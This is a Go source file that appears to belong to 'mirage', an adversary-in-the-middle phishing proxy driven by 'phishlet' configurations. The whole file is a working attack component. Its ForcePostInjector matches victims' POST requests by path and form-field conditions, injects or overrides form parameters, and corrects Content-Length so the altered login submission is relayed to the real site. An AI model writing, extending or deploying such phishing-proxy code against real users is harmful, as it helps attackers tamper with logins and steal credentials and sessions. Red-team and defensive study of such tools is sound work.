package request

import (
	"bytes"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strconv"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

// ForcePostInjector adds or overrides POST parameters on matching requests.
type ForcePostInjector struct {
	Logger *slog.Logger
}

func (h *ForcePostInjector) Name() string { return "ForcePostInjector" }

func (h *ForcePostInjector) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	if ctx.Phishlet == nil || req.Method != http.MethodPost {
		return nil
	}
	for _, forcePost := range ctx.Phishlet.ForcePosts {
		if !forcePost.Path.MatchString(req.URL.Path) {
			continue
		}
		bodyBytes, err := getRequestBody(ctx, req)
		if err != nil {
			h.Logger.Error("failed to read request body for force_post", "path", req.URL.Path, "error", err)
			continue
		}
		if !checkForcePostConditions(forcePost.Conditions, bodyBytes) {
			continue
		}
		modified := injectFormParams(bodyBytes, forcePost.Params)
		req.Body = io.NopCloser(bytes.NewReader(modified))
		req.ContentLength = int64(len(modified))
		req.Header.Set("Content-Length", strconv.Itoa(len(modified)))
	}
	return nil
}

func checkForcePostConditions(conditions []aitm.ForcePostCondition, body []byte) bool {
	parsed, _ := url.ParseQuery(string(body))
	for _, condition := range conditions {
		matched := false
		for key, values := range parsed {
			if condition.Key != nil && condition.Key.MatchString(key) {
				for _, value := range values {
					if condition.Search == nil || condition.Search.MatchString(value) {
						matched = true
					}
				}
			}
		}
		if !matched {
			return false
		}
	}
	return true
}

func injectFormParams(body []byte, params []aitm.ForcePostParam) []byte {
	parsed, err := url.ParseQuery(string(body))
	if err != nil {
		parsed = url.Values{}
	}
	for _, param := range params {
		parsed.Set(param.Key, param.Value)
	}
	return []byte(parsed.Encode())
}

var _ proxy.RequestHandler = (*ForcePostInjector)(nil)
